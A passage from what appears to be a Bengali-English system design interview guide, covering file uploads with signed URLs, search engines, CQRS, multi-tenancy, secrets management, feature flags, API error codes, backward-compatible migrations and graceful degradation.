Client -> Object Storage: upload file
```

### Why Signed URL

- Backend bandwidth save
- Large file direct upload
- Better scalability
- Permission controlled upload

### Security Checks

- File type validation
- File size limit
- Virus scanning
- Private bucket
- Signed URL expiry
- Content-Disposition safe করা

### Senior Insight

User-uploaded file dangerous হতে পারে। Image নামে executable/script upload হতে পারে। Public file serve করলে content type, filename, and access control careful হতে হবে।

### Common Mistakes

- File backend local disk-এ রাখা।
- File extension trust করা।
- Unlimited upload size।
- Public bucket accidentally open রাখা।
- Same filename collision।

### Interview Angle

> Large file uploads should use object storage and signed URLs. Senior design validates type/size, scans files, controls access, sets expiry, and avoids storing uploads on local app servers.

## 53. Search Systems (Elasticsearch/OpenSearch)

### Core Idea

Relational DB exact query-এর জন্য ভালো, কিন্তু full-text search, ranking, fuzzy search-এর জন্য search engine better।

### Use Cases

- Product search
- Log search
- Document search
- Autocomplete
- Filtering/faceting

### Search Index Flow

```text
Primary DB -> Event/CDC -> Search Index
```

### Why Not Just SQL LIKE

```sql
WHERE name LIKE '%phone%'
```

Large table-এ slow হতে পারে, ranking/fuzzy/stemming support weak।

### Senior Insight

Search index usually eventually consistent। DB update সাথে সাথে search result update নাও হতে পারে।

Need:

- Reindex strategy
- Mapping design
- Analyzer/tokenizer
- Backfill
- Index alias for zero-downtime rebuild

### Common Mistakes

- Elasticsearch-কে primary database হিসেবে use করা।
- Mapping plan ছাড়া index করা।
- Reindex plan না রাখা।
- Search result consistency expectation ভুল।

### Interview Angle

> Search engines like Elasticsearch/OpenSearch are used for full-text search, ranking, filters, and autocomplete. They are usually fed from the primary DB asynchronously, so eventual consistency and reindexing strategy matter.

## 54. CQRS (Command Query Responsibility Segregation)

### Core Idea

CQRS write model এবং read model আলাদা করে।

- **Command:** data change করে।
- **Query:** data read করে।

### Example

Write model normalized:

```text
orders, order_items, payments
```

Read model denormalized:

```text
order_summary_view
```

### Benefits

- Read optimization
- Write logic clean
- Different scaling
- Complex reporting/feed easier

### Costs

- More complexity
- Eventual consistency
- Sync mechanism দরকার
- More storage

### Senior Insight

CQRS everywhere দরকার নেই। High-read, complex projection, event-driven, reporting-heavy system-এ useful।

### Common Mistakes

- Simple CRUD app-এ CQRS overengineering।
- Read model stale হতে পারে সেটা UI-তে handle না করা।
- Projection rebuild strategy না রাখা।

### Interview Angle

> CQRS separates write and read models. It helps optimize complex reads and scale independently, but adds eventual consistency and operational complexity.

## 55. Multi-Tenancy

### Core Idea

একই application multiple customer/organization serve করলে multi-tenancy।

Tenant example:

```text
Company A
Company B
Company C
```

### Models

#### Shared Database, Shared Schema

Same tables, `tenant_id` column।

Pros:

- Cheap
- Simple operations

Cons:

- Data isolation risk

#### Shared Database, Separate Schema

Each tenant separate schema।

Pros:

- Better isolation

Cons:

- Migration complexity

#### Separate Database Per Tenant

Best isolation।

Pros:

- Strong isolation
- Per-tenant backup/restore easier

Cons:

- Operationally expensive

### Senior Insight

Every query must include tenant boundary। Missing `tenant_id` filter can leak customer data, which is severe security incident।

### Common Mistakes

- Tenant ID frontend থেকে trust করা।
- DB query tenant filter ছাড়া করা।
- Background job tenant context ছাড়া run করা।
- Cross-tenant cache key collision।

### Interview Angle

> Multi-tenancy serves multiple customers from one system. Models range from shared schema to separate database. Senior engineers focus on data isolation, tenant-aware queries, cache keys, jobs, and access control.

## 56. Secrets Management

### Core Idea

Secrets হলো sensitive credentials:

- DB password
- API key
- JWT secret
- OAuth secret
- Encryption key

### Best Practices

- Secrets repo-তে commit করা যাবে না।
- Environment variable বা secret manager use করা।
- Rotate secrets।
- Least privilege।
- Audit secret access।

### Tools

- AWS Secrets Manager
- GCP Secret Manager
- Azure Key Vault
- HashiCorp Vault
- Kubernetes Secrets with proper encryption

### Senior Insight

Secret rotation plan না থাকলে leak হলে recovery hard। Production key rotate করতে app support দরকার, যেমন JWT key rotation with `kid`।

### Common Mistakes

- `.env` GitHub-এ commit করা।
- Same secret dev/staging/prod-এ use করা।
- Long-lived API keys।
- Logs-এ secret print করা।
- Secret rotation test না করা।

### Interview Angle

> Secrets management protects credentials using secret stores, least privilege, rotation, and audit logs. Senior systems assume secrets may leak and design rotation and blast-radius reduction.

## 57. Feature Flags

### Core Idea

Feature flag দিয়ে deploy এবং release আলাদা করা যায়।
অনেক ডেভেলপার মনে করেন কোড প্রোডাকশনে পাঠানো মানেই সেটা ইউজারের কাছে চলে যাওয়া। কিন্তু সিনিয়ররা এই দুইটা কাজকে আলাদা রাখেন:

- Deployment: আপনার নতুন কোড প্রোডাকশন সার্ভারে চলে গেছে, কিন্তু সেটা কেউ দেখতে পাচ্ছে না (কারন Flag বন্ধ)।

- Release: আপনি এখন কন্ট্রোল প্যানেল থেকে Flag টি true করে দিলেন, এবং ইউজাররা ফিচারটি দেখতে শুরু করল।

Kill Switch (বিপদের বন্ধু):
ধরুন, আপনি HRIS প্রজেক্টে নতুন একটা "Salary Calculation" মেকানিজম লঞ্চ করলেন। প্রোডাকশনে যাওয়ার পর দেখলেন কিছু ইউজারের স্যালারি ভুল আসছে।

ফ্ল্যাগ ছাড়া: আপনাকে কোড ফিক্স করতে হবে, আবার বিল্ড দিতে হবে, আবার ডিপ্লয় করতে হবে (কমপক্ষে ২০-৩০ মিনিট)।

ফ্ল্যাগ সহ: আপনি জাস্ট ১ সেকেন্ডে ড্যাশবোর্ড থেকে ফ্ল্যাগটি OFF করে দেবেন। সিস্টেম সাথে সাথে পুরনো (Stable) মেকানিজমে ফিরে যাবে। এটাকে বলা হয় Instant Rollback।

Canary Release (Gradual Rollout):
সব ইউজারকে একসাথে নতুন ফিচার না দিয়ে প্রথমে শুধু আপনার অফিসের ৫% ইউজারকে দিন। যদি সব ঠিক থাকে, তবে ২০%, ৫০%, এবং সবশেষে ১০০% ইউজারকে দিন। এতে বড় ধরনের ক্র্যাশ হওয়ার ঝুঁকি কমে যায়।

```text
Code deployed, feature disabled
Enable for 5% users
Enable for everyone
```

### Use Cases

- Gradual rollout
- A/B testing
- Kill switch
- Internal beta
- Permission-based features

### Senior Insight

Feature flags production safety বাড়ায়, কিন্তু long-lived flags technical debt তৈরি করে। Flag lifecycle manage করতে হয়:

- Create
- Rollout
- Monitor
- Remove

### Common Mistakes

- Old flags cleanup না করা।
- Flag state cache problem।
- Critical code path flag দিয়ে complex করা।
- Migration flag without rollback thinking।

### Interview Angle

> Feature flags separate deployment from release. They enable gradual rollout and quick rollback, but require cleanup and careful testing of both enabled and disabled paths.

## 58. API Error Handling & Status Codes

### Core Idea

Good API error response predictable, actionable, and safe হওয়া উচিত।

### Common Status Codes

- `200 OK`: Successful read/update।
- `201 Created`: Resource created।
- `202 Accepted`: Async processing accepted।
- `400 Bad Request`: Invalid input।
- `401 Unauthorized`: Not authenticated।
- `403 Forbidden`: Authenticated but not allowed।
- `404 Not Found`: Resource নেই।
- `409 Conflict`: State conflict।
- `422 Unprocessable Entity`: Semantic validation error।
- `429 Too Many Requests`: Rate limit।
- `500 Internal Server Error`: Unexpected server error।
- `503 Service Unavailable`: Temporary unavailable।

### Good Error Shape

```json
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "Invalid request data",
    "details": [
      {
        "field": "email",
        "message": "Email is required"
      }
    ],
    "requestId": "req_123"
  }
}
```

### Senior Insight

Internal stack trace client-কে দেওয়া যাবে না। But request ID দিলে logs থেকে debug করা যায়।

### Common Mistakes

- সব error `500` দেওয়া।
- Auth error and permission error confuse করা।
- Sensitive info response-এ leak করা।
- Error format inconsistent।

### Interview Angle

> API errors should use correct status codes and consistent response shape. Senior systems include machine-readable error codes, request IDs, safe messages, and avoid leaking internals.

## 59. Data Migration & Backward Compatibility

### Core Idea

সহজভাবে বলতে গেলে, "সিস্টেম আপডেট হবে, কিন্তু ইউজার টের পাবে না যে ব্যাকএন্ডে কিছু পাল্টেছে।"

ধরুন, আপনার User টেবিলে name নামে একটি কলাম আছে। আপনি এটাকে ভেঙে first_name এবং last_name করতে চান।

আপনি যদি সরাসরি name ড্রপ করে নতুন দুটি কলাম যোগ করেন এবং কোড ডিপ্লয় দেন, তবে ডিপ্লয়মেন্টের ওই কয়েক মিনিটে (বা রলব্যাক করলে) আপনার পুরনো কোড name কলাম খুঁজবে কিন্তু পাবে না। ফলাফল: ৫০০ Internal Server Error।

### Safe Migration Pattern (Expand and Contract)

1. Add new nullable column/table। : প্রথমে ডাটাবেসে নতুন কলামগুলো (first_name, last_name) যোগ করুন এবং সেগুলোকে Nullable রাখুন। (পুরনো কোড এখনো আগের মতোই চলছে)।

2. Deploy app that writes both old and new fields।: এবার এমন কোড ডিপ্লয় দিন যা name এও ডেটা লিখবে, আবার নতুন দুই কলামেও ডেটা সেভ করবে। এতে নতুন ডেটাগুলো দুই জায়গাতেই থাকছে।

3. Backfill old data।: একটা স্ক্রিপ্ট বা ব্যাকগ্রাউন্ড জব (যেমন NestJS-এ BullMQ দিয়ে) চালিয়ে পুরনো সব ইউজারদের name থেকে ডেটা নিয়ে নতুন কলামগুলোতে কপি করুন। বড় টেবিল হলে এটা Batching করে করতে হয় (একবারে ১০০০ জন করে), নাহলে ডাটাবেস লক হয়ে যেতে পারে।

4. Switch reads to new field।: এখন কোড আপডেট করুন যেন সে শুধু নতুন কলামগুলো থেকে ডেটা রিড করে।

5. Stop writing old field।: সব ঠিক থাকলে পুরনো কলামে ডেটা রাইট করা বন্ধ করে দিন।

6. Drop old field later।: কয়েকদিন পর নিশ্চিত হয়ে পুরনো name কলামটি ড্রপ করে দিন।

### Senior Insight

Breaking migration deploy-এর সাথে করলে rollback impossible হতে পারে। App rollback করলে old code new schema বুঝবে কি না ভাবতে হয়।

### Common Mistakes

- Rename/drop column directly।
- Huge table lock করে migration।
- Backfill without batching।
- Migration rollback plan না রাখা।
- Old app compatibility test না করা।

### Interview Angle

> Safe data migration is backward-compatible and usually multi-step. Senior engineers avoid breaking old app versions, batch backfills, monitor locks, and keep rollback strategy.

## 60. Resilience & Graceful Degradation

### Core Idea

System-এর কোনো dependency fail করলেও পুরো product dead না করে partial functionality চালু রাখা।

- Resilience: সিস্টেম যেন ঝাপটা সামলে আবার আগের অবস্থায় ফিরে আসতে পারে (যেমন: রিট্রাই মেকানিজম)।
- Graceful Degradation: যদি কোনো একটা হাত বা পা ভেঙেও যায় (Dependency fail), তাও যেন মানুষটা অন্তত বেঁচে থাকে (সিস্টেম আংশিক কাজ করে)

### Examples

- Recommendation service down হলে default popular items show করা।
- Email service down হলে queue retry করা।
- Analytics fail হলে user request fail না করা।
- Cache down হলে DB fallback, but rate controlled।

### Techniques

- Timeout

- Circuit breaker: `কাজ`: যদি আপনার কোনো একটা থার্ড-পার্টি API (যেমন: SMS Gateway) বারবার ফেইল করে, তবে সার্কিট ব্রেকার ওই সার্ভিসে রিকোয়েস্ট পাঠানো বন্ধ করে দেয়। `কেন`: যেন বারবার ফেইল হওয়া রিকোয়েস্টের পেছনে আপনার সিস্টেমের মেমোরি বা থ্রেড নষ্ট না হয়। কিছুক্ষণ পর সে অটোমেটিক আবার চেক করবে সার্ভিসটা ঠিক হয়েছে কি না।

- Bulkhead isolation: জাহাজের ভেতরে আলাদা আলাদা কুঠুরি থাকে। যদি একটা ফুটো হয়ে পানি ঢোকে, তবে শুধু ওই রুমটাই ডুববে, পুরো জাহাজ ডুববে না। `কাজ`: NestJS অ্যাপে হয়তো অনেকগুলো মডিউল আছে। আপনি যদি আলাদা আলাদা রিসোর্স পুল (Thread/Memory) সেট করেন, তবে এক জায়গায় এরর হলে অন্য মডিউলগুলো অ্যাফেক্টেড হবে না।

- Fallback response: এটিই মূলত Graceful Degradation। `উদাহরণ`: আপনি একটি ই-কমার্স অ্যাপ বানাচ্ছেন। ইউজারের পারসোনালাইজড সাজেশন দেখানোর সার্ভিসটা ডাউন। `Fallback`: ইউজারকে এরর না দেখিয়ে ডাটাবেসে থাকা ৫টি "সবার জন্য কমন/জনপ্রিয়" আইটেম দেখিয়ে দিন। ইউজার বুঝতেই পারবে না যে পেছনের একটা সার্ভিস ফেইল করেছে।

- Queue buffering: হলো সিস্টেম ডিজাইনের এমন একটি কৌশল যেখানে ইনকামিং রিকোয়েস্ট বা ডেটাকে সরাসরি প্রোসেস না করে একটি মধ্যবর্তী "বাফার" বা লাইনে (Queue) জমা রাখা হয়। এটি অনেকটা ব্যস্ত দোকানের বাইরে মানুষের লাইনে দাঁড়িয়ে থাকার মতো—দোকানি (Server) তার গতিতে কাজ করবে, আর কাস্টমাররা (Requests) লাইনে অপেক্ষা করবে। `Producer`: ইউজার বা এপিআই রিকোয়েস্ট। `Buffer (Queue)`: Redis বা RabbitMQ (যেখানে ডেটা সাময়িকভাবে জমা থাকে)। `Consumer`: ব্যাকএন্ড প্রসেসর যা তার নিজের সাধ্যমতো কিউ থেকে ডেটা নিয়ে কাজ শেষ করে।

- Rate limiting
- Load shedding: যখন সিস্টেমে অতিরিক্ত ট্রাফিক আসে এবং সিপিইউ ১০০% হয়ে যায়, তখন সব রিকোয়েস্ট এক্সেপ্ট না করে কিছু রিকোয়েস্ট ড্রপ করা।

### Senior Insight

সব dependency equal critical না। Payment fail হলে checkout stop হবে, কিন্তু analytics fail হলে user experience stop করা উচিত না।

### Common Mistakes

- Non-critical dependency failure user request fail করানো।
- Fallback stale data mark না করা।
- Cache fail হলে DB overload।
- No load shedding under pressure।

### Interview Angle

> Resilience means designing systems to survive partial failures. Senior systems use timeout, circuit breaker, fallback, bulkheads, load shedding, and graceful degradation based on business criticality. আমি সিস্টেমকে এমনভাবে ডিজাইন করব যেন Single Point of Failure না থাকে। আমি ক্রিটিক্যাল এবং নন-ক্রিটিক্যাল ডিপেন্ডেন্সি আলাদা করব। নন-ক্রিটিক্যাল সার্ভিসের জন্য Fallback এবং Circuit Breaker ইউজ করব। যেমন: যদি সোশ্যাল লগইন ডাউন থাকে, আমি ইউজারকে সাধারণ ইমেইল লগইনের জন্য প্রম্পট করব, পুরো অ্যাপ ডাউন দেখাব না।
